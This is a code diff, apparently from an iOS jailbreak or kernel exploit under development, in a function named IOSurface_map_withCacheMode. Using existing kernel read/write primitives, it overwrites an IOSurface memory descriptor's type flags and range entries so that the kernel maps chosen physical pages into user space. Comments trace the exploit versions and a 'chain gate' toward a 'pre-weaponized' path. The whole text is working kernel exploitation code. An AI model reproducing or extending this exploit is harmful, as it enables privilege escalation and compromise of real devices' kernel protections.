@@ -269,31 +269,31 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 		*uaddr = NULL;
 		return -1;
 	}
-	// v95: candidate selection per window — the re-wire flag ladder.
-	// Even seq = kIOMemoryTypePhysical (0x2): entries are PA (as written).
-	// Odd  seq = kIOMemoryTypeKernelVirtual (0x4): entries = kernel VAs.
-	uint32_t typeCand = (seq & 1) ? 0x4 : 0x2;
+	// v96: candidate selection per window — NIBBLE-PRESERVING type ladder
+	// (v95 verdict: original flags = 0x110113, low nibble 3 = real type +
+	// 0x110000 required high bits; my bare 0x2/0x4 candidates were wrong
+	// encodings AND stripped the high bits). Keep f20's high bits, flip
+	// ONLY the low nibble across windows (seq % 8); seq%8==3 = control
+	// (original 3). Entries stay PA (physical interpretations win or the
+	// window visibly no-ops with C,first=0,0).
+	uint32_t f20live = kread32(desc + 0x20);
+	uint32_t nib     = (uint32_t)(seq % 8);
 	for (int ei = 0; ei < 4; ei++) {
-		uint64_t e0 = (typeCand == 0x2)
-		    ? (pa + ei * 0x4000ULL)                                  // physical
-		    : phystokv(kvtophys(pa + ei * 0x4000ULL) & ~0x3FFFULL);  // kernel VA
-		kwrite64(arrAlias + arrOff + 0x10 * ei + 0x0, e0);
+		kwrite64(arrAlias + arrOff + 0x10 * ei + 0x0, pa + ei * 0x4000ULL);
 		kwrite64(arrAlias + arrOff + 0x10 * ei + 0x8, 0x4000ULL);
 	}
-	jb_tr_beacon("KMAP ranges4,pa=%llx,cand=%x,e0=%llx,%llx",
-	             (unsigned long long)pa, typeCand,
+	jb_tr_beacon("KMAP ranges4,pa=%llx,nib=%x,e0=%llx,%llx",
+	             (unsigned long long)pa, nib,
 	             (unsigned long long)kread64(arrAlias + arrOff),
 	             (unsigned long long)kread64(arrAlias + arrOff + 8));
 
-	// v95 RE-WIRE part 1: force the next wire to interpret entries per
-	// typeCand. v94 verdict: the wire happened at CREATE from the ORIGINAL
-	// list (C,first=0,0 = the zeroed dummy page) — post-create edits are
-	// invisible while wired. desc+0x20 = memory-type flags (v76-proven
-	// full-32-bit kwrite32 class, large object window).
+	// v96 RE-WIRE part 1: nibble-preserving flag write — (f20live &
+	// ~0xF) | nib. seq%8==3 windows write the ORIGINAL value (control).
 	uint32_t f20pre = kread32(desc + 0x20);
-	kwrite32(desc + 0x20, typeCand);
-	jb_tr_beacon("KMAP flags,pre=%x,want=%x,rb=%x",
-	             f20pre, typeCand, kread32(desc + 0x20));
+	uint32_t f20want = (f20pre & ~0xFULL) | nib;
+	kwrite32(desc + 0x20, f20want);
+	jb_tr_beacon("KMAP flags,pre=%x,nib=%x,want=%x,rb=%x",
+	             f20pre, nib, f20want, kread32(desc + 0x20));
 
 	// desc.size retarget via W[0x48,0x68) (v93-proven window/offsets).
 	uint8_t winA[0x20];
@@ -338,12 +338,10 @@ int IOSurface_map_withCacheMode(uint64_t pa, uint64_t size, void **uaddr, uint32
 	             (unsigned long long)kread64(surfaceSendRight + 0x30));
 
 	// THE KERNEL DOES THE MAPPING: post-cycle lookup + GetBaseAddress.
-	// (Fresh ref after the use-count cycle — the create-time ref may be
-	// stale if the unwire invalidated it.) Content discriminator through
-	// the kernel-built mapping: TARGET WINDOW CONTENT ⇒ RE-WIRED AND
-	// MAPPED = THE PROBE WINDOW = CHAIN GATE. 0,0 (or repeated qword) ⇒
-	// the re-wire didn't take (wire is create-once; v96 = pre-weaponized
-	// creation path). 539,0-style own-ID ⇒ wired from original list.
+	// Content discriminator: TARGET WINDOW CONTENT with a low-nibble
+	// winner ⇒ that nibble IS the wire type = THE PROBE WINDOW = CHAIN
+	// GATE. All windows 0,0 ⇒ wire is create-once regardless of type ⇒
+	// v97 = pre-weaponized creation (real ranges via the public API).
 	IOSurfaceRef refB = IOSurfaceLookupFromMachPort(surfaceMachPort);
 	int lookupB = (refB != NULL);
 	void *base1 = lookupB ? IOSurfaceGetBaseAddress(refB) : NULL;
